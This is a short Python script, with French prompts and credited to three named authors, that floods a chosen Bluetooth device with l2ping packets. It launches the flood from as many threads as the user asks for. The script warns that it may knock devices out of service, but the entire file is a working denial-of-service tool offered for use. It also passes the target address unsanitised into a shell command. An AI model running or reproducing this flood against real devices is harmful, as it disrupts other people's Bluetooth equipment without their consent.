import os
import threading
import time

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    print("Made by :")
    print("MORIN Loic")
    print("MADA-MBARI Christian")
    print("SELETLI Delal")


def main(target_addr):
    printLogo()
    if len(target_addr) < 1:
        print('Erreur ! adresse cible manquante')
        exit(0)
    time.sleep(0.1)
    print('')
    print("Ce programme se trouve etre dangereux et peut mettre en peril vos différents appareils et ne plus les faire fonctionner. Prenez cela en consideration avant de l'utiliser, nous ne sommes pas responsable de la moindre casse !")
    if (input("Voulez-vous toujours continué ? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')



     

        try:
            packages_size = int(input('Taille du paquet > '))
        except:
            print('Erreur ! La taille du paquet doit être un nombre')
            exit(0)
        try:
            threads_count = int(input("Nombre de processus > "))
        except:
            print('Erreur ! Le nombre de processus doit être un nombre')
            exit(0)
        print('')
        os.system('clear')

        print("Début dans 3 secondes...")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
        os.system('clear')
        print('Création des processus\n')

        for i in range(0, threads_count):
            print('[*] Processus créé №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Création des processus...')
        print('[*] Début...')
    else:
        print('Au revoir')
        exit(0)

def use(adresseMac) :
    try:
        os.system('clear')
        main(adresseMac)
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Abandonne')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] Erreur: ' + str(e))
